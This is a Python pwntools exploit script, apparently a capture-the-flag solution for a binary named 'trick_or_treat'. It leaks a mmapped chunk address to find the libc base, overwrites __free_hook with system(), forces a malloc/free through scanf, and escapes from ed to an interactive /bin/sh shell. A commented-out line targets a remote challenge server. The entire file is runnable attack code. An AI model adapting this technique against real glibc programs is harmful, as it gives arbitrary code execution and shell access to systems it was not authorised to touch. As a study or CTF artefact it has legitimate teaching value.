#!/usr/bin/env python2

from pwn import *

elf = ELF('./trick_or_treat')
libc = ELF('./libc.so.6')

p = process('./trick_or_treat')
#p = remote('3.112.41.140', 56746)

context.terminal = ['tmux', 'new-window']

p.recv()

# Get a new mmapped chunk right before libc
# also aligned with libc
p.sendline('10000000')

chunk = int(p.recv().split('\n')[0].split(':')[1], 16)
libc.address = chunk + 0x989ff0
free_hook = libc.symbols['__free_hook']
free_hook_off = (free_hook - chunk) / 8
system = libc.symbols['system']

log.info('Chunk: ' + hex(chunk))
log.info('__free_hook: ' + hex(free_hook))
log.info('free_hook_off: ' + hex(free_hook_off))
log.info('system: ' + hex(system))
log.info('Libc base: ' + hex(libc.address))

# Overwrite __free_hook with system
p.sendline('{} {}'.format(hex(free_hook_off), hex(system)))

print p.recv()

# Make scanf call malloc followed by free
p.sendline('A'*50000)

# Call system('ed')
p.sendline('ed')

# Escape out of ed and get a shell
p.sendline('!/bin/sh')

p.interactive()
